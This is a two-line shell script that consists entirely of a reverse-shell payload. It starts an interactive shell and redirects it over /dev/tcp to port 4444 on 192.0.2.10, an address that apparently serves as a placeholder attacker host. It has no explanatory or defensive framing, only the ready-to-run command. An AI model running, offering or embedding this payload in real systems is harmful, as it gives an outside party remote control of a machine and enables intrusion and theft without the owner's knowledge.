#!/bin/sh
sh -i >& /dev/tcp/192.0.2.10/4444 0>&1
